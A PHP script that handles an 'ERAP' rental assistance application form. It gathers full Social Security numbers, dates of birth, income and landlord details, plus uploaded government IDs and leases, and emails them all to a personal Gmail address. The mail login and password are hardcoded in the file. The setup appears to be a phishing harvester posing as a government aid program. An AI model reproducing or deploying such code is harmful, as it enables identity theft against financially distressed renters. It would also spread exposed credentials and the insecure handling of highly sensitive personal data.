<?php
declare(strict_types=1);

use Earnest\Mail\SimpleSMTPMailer;

require_once __DIR__ . '/lib/SimpleSMTPMailer.php';

$smtpConfig = [
    'host'       => 'smtp.hostinger.com',
    'port'       => 465,
    'username'   => 'contact@earnestexpressllc.com',
    'password'   => 'Weareallmad123@',
    'encryption' => 'ssl',
    'from_email' => 'contact@earnestexpressllc.com',
    'from_name'  => 'Erap application',
    'to_email'   => 'earnestexpress12@gmail.com',
];

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../index.html');
    exit();
}

$clean = static function ($value): string {
    $value = is_string($value) ? $value : (string) $value;
    $value = preg_replace('/[\\x00-\\x1F\\x7F]/u', '', $value);
    return trim($value);
};

$name             = $clean($_POST['full_name'] ?? '');
$dob              = $clean($_POST['date_of_birth'] ?? '');
$email            = $clean($_POST['email'] ?? '');
$phone            = $clean($_POST['phone'] ?? '');
$ssn              = $clean($_POST['ssn'] ?? '');
$address          = $clean($_POST['address'] ?? '');
$city             = $clean($_POST['city'] ?? '');
$state            = $clean($_POST['state'] ?? '');
$zip              = $clean($_POST['zip'] ?? '');
$employment       = $clean($_POST['employment_status'] ?? '');
$employer         = $clean($_POST['employer_name'] ?? '');
$household_size   = $clean($_POST['household_size'] ?? '');
$income           = $clean($_POST['income'] ?? '');
$income_sources   = $clean($_POST['income_sources'] ?? '');
$current_rent     = $clean($_POST['current_rent'] ?? '');
$months_past_due  = $clean($_POST['months_past_due'] ?? '');
$total_arrears    = $clean($_POST['total_arrears'] ?? '');
$future_rent      = $clean($_POST['future_rent'] ?? '');
$total_assistance = $clean($_POST['total_assistance'] ?? '');
$hardship         = $clean($_POST['hardship'] ?? '');
$landlord_name    = $clean($_POST['landlord_name'] ?? '');
$landlord_phone   = $clean($_POST['landlord_phone'] ?? '');
$landlord_email   = $clean($_POST['landlord_email'] ?? '');
$landlord_accepts = isset($_POST['landlord_accepts_payments']) ? 'Yes' : 'No';
$rent_past_due    = $clean($_POST['rent_past_due'] ?? '');
$rent_future      = $clean($_POST['rent_future'] ?? '');
$utility_request  = isset($_POST['utility_assistance']) ? implode(', ', (array)$_POST['utility_assistance']) : 'None selected';
$assistance_total = $clean($_POST['assistance_total'] ?? '');
$contact_auth     = isset($_POST['contact_authorization']) ? 'Yes' : 'No';
$accuracy_cert    = isset($_POST['accuracy_certification']) ? 'Yes' : 'No';
$attestation      = isset($_POST['attestation']) ? 'Yes' : 'No';
$digital_signature= $clean($_POST['digital_signature'] ?? '');
$signature_date   = $clean($_POST['signature_date'] ?? '');

$fields = [
    "FULL NAME" => $name,
    "DATE OF BIRTH" => $dob,
    "EMAIL" => $email,
    "PHONE" => $phone,
    "FULL SSN" => $ssn,
    "STREET ADDRESS" => $address,
    "CITY" => $city,
    "STATE" => $state,
    "ZIP" => $zip,
    "EMPLOYMENT STATUS" => $employment,
    "EMPLOYER NAME" => $employer,
    "HOUSEHOLD SIZE" => $household_size,
    "ANNUAL HOUSEHOLD INCOME" => $income,
    "INCOME SOURCES" => $income_sources,
    "CURRENT MONTHLY RENT" => $current_rent,
    "MONTHS PAST DUE" => $months_past_due,
    "TOTAL ARREARS" => $total_arrears,
    "FUTURE RENT REQUESTED" => $future_rent,
    "TOTAL ASSISTANCE REQUESTED" => $total_assistance,
    "HARDSHIP DESCRIPTION" => $hardship,
    "LANDLORD/PROPERTY MANAGER NAME" => $landlord_name,
    "LANDLORD PHONE" => $landlord_phone,
    "LANDLORD EMAIL" => $landlord_email,
    "LANDLORD ACCEPTS DIRECT PAYMENT" => $landlord_accepts,
    "RENT ASSISTANCE (PAST DUE)" => $rent_past_due,
    "RENT ASSISTANCE (FUTURE)" => $rent_future,
    "UTILITY ASSISTANCE REQUESTED" => $utility_request,
    "TOTAL AMOUNT REQUESTED (ALL CATEGORIES)" => $assistance_total,
    "CONTACT AUTHORIZATION" => $contact_auth,
    "ACCURACY CERTIFICATION" => $accuracy_cert,
    "ATTESTATION" => $attestation,
    "DIGITAL SIGNATURE" => $digital_signature,
    "SIGNATURE DATE" => $signature_date,
];

$required = [$name, $email, $phone, $address, $city, $state, $zip];
if (in_array('', $required, true) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo "<h1>Application Error</h1><p>Please complete all required fields with a valid email.</p><a href='../erap-apply.html'>Go Back</a>";
    exit();
}

$safe = static function (string $value): string {
    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
};

$rowsHtml = '';
foreach ($fields as $label => $value) {
    $rowsHtml .= '<tr><th style="text-align:left;padding:6px 10px;background:#f5f5f5;width:220px;font-family:Arial,sans-serif;">'
        . $safe($label) . '</th><td style="padding:6px 10px;font-family:Arial,sans-serif;">' . nl2br($safe($value)) . '</td></tr>';
}

$htmlBody = '<h2 style="font-family:Arial,sans-serif;margin-bottom:12px;">New ERAP Application</h2>'
    . '<p style="font-family:Arial,sans-serif;margin:0 0 12px;">A new ERAP application was submitted. Details are below.</p>'
    . '<table style="border-collapse:collapse;width:100%;max-width:720px;font-size:14px;">' . $rowsHtml . '</table>';

$textLines = [];
foreach ($fields as $label => $value) {
    $textLines[] = $label . ': ' . $value;
}
$textBody = "New ERAP Application\n\n" . implode("\n", $textLines);

$attachments = [];
$fileLabels = [
    'id_document' => 'Government-issued ID',
    'income_proof' => 'Proof of Income',
    'lease_agreement' => 'Lease Agreement',
    'eviction_notice' => 'Eviction or Past-Due Notice',
    'utility_bills' => 'Utility Bill',
];

foreach ($fileLabels as $field => $label) {
    if (!isset($_FILES[$field])) {
        continue;
    }
    $fileData = $_FILES[$field];
    if (is_array($fileData['tmp_name'])) {
        foreach ($fileData['tmp_name'] as $idx => $tmpName) {
            if ($tmpName && ($fileData['error'][$idx] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
                $attachments[] = ['path' => $tmpName, 'name' => $fileData['name'][$idx] ?? ($label . '-' . $idx)];
            }
        }
    } elseif (!empty($fileData['tmp_name']) && ($fileData['error'] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
        $attachments[] = ['path' => $fileData['tmp_name'], 'name' => $fileData['name'] ?? $label];
    }
}

try {
    $mailer = new SimpleSMTPMailer(
        $smtpConfig['host'],
        (int)$smtpConfig['port'],
        $smtpConfig['username'],
        $smtpConfig['password'],
        $smtpConfig['encryption']
    );

    $mailer->send(
        $smtpConfig['from_email'],
        $smtpConfig['from_name'],
        $smtpConfig['to_email'],
        "NEW ERAP APPLICATION: {$name}",
        $htmlBody,
        $textBody,
        $attachments
    );
} catch (\Throwable $exception) {
    error_log('[ERAP] Mail send failed: ' . $exception->getMessage());
    echo "<h1>Application Error</h1>";
    echo "<p>We were unable to process your application at this time. Please contact support.</p>";
    echo "<pre>" . htmlspecialchars($exception->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
    echo "<a href='../erap-apply.html'>Go Back</a>";
    exit();
}

header("Location: ../erap-urs-prompt.html");
exit();
